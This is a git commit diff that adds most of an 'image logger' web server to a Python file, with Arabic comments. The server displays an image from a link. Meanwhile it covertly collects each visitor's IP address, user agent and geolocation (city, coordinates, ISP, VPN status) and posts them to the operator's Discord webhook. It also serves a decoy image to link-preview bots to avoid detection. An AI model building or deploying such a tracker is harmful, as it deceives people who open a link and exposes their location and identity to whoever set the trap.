e2811be63a7ea49bb6d0f46fa34ebd7ca802fba7
hezn911 <meshalmmdoh@gmail.com>
2025-05-01 14:38:28 +0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -81,3 +81,110 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **PC Info:**
 > **OS:** `{httpagentparser.simple_detect(useragent)[0]}`
 > **Browser:** `{httpagentparser.simple_detect(useragent)[1]}`
+
+**User Agent:**
+
+"""
+            }
+        ],
+    }
+
+    if url:
+        embed["embeds"][0].update({"thumbnail": {"url": url}})
+    
+    requests.post(config["webhook"], json = embed)
+    return info
+
+# إعداد الخادم للتعامل مع الطلبات
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
+    def handleRequest(self):
+        try:
+            # تحديد الصورة
+            s = self.path
+            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+            if dic.get("url") or dic.get("id"):
+                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+            else:
+                url = config["image"]
+
+            # إنشاء بيانات الصفحة
+            data = f'''<style>body {{
+                margin: 0;
+                padding: 0;
+            }}
+            div.img {{
+                background-image: url('{url}');
+                background-position: center center;
+                background-repeat: no-repeat;
+                background-size: contain;
+                width: 100vw;
+                height: 100vh;
+            }}</style><div class="img"></div>'''.encode()
+
+            # التحقق من IP إذا كان محظور
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
+
+            # التحقق من البوتات
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.end_headers()
+                if config["buggedImage"]:
+                    self.wfile.write(base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'))  # صورة التحميل
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                return
+            
+            # إنشاء التقرير
+            result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+            
+            # إرسال الرسالة
+            message = config["message"]["message"]
+            if config["message"]["richMessage"] and result:
+                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                message = message.replace("{isp}", result["isp"])
+                message = message.replace("{asn}", result["as"])
+                message = message.replace("{country}", result["country"])
+                message = message.replace("{region}", result["regionName"])
+                message = message.replace("{city}", result["city"])
+                message = message.replace("{lat}", str(result["lat"]))
+                message = message.replace("{long}", str(result["lon"]))
+                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                message = message.replace("{mobile}", str(result["mobile"]))
+                message = message.replace("{vpn}", str(result["proxy"]))
+                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+            datatype = 'text/html'
+            if config["message"]["doMessage"]:
+                data = message.encode()
+
+            # إرسال البيانات
+            self.send_response(200)
+            self.send_header('Content-type', datatype)
+            self.end_headers()
+            self.wfile.write(data)
+
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+# تشغيل الخادم
+def run(server_class=HTTPServer, handler_class=ImageLoggerAPI, port=8080):
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    print(f'Starting httpd server on port {port}...')
+    httpd.serve_forever()
+
+if __name__ == "__main__":
+    run()
